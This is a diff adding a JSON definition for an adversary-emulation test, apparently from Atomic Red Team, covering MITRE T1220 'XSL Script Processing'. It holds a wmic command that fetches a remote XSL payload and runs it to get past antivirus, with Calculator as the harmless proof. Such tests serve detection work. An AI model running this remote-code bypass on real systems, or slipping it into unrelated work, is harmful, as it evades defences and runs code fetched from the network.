@@ -1,0 +1,34 @@
+{
+    "name": "WMIC bypass using remote XSL file",
+    "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "wmic #{wmic_command} /FORMAT:\"#{remote_xsl_file}\"\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1220",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "XSL Script Processing",
+    "source": "ART",
+    "uuid": "7f5be499-33be-4129-a560-66021f379b9b",
+    "arguments": {
+        "remote_xsl_file": {
+            "description": "Remote location of an XSL payload.",
+            "type": "url",
+            "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
+        },
+        "wmic_command": {
+            "description": "WMI command to execute using wmic.exe",
+            "type": "string",
+            "default": "process list"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
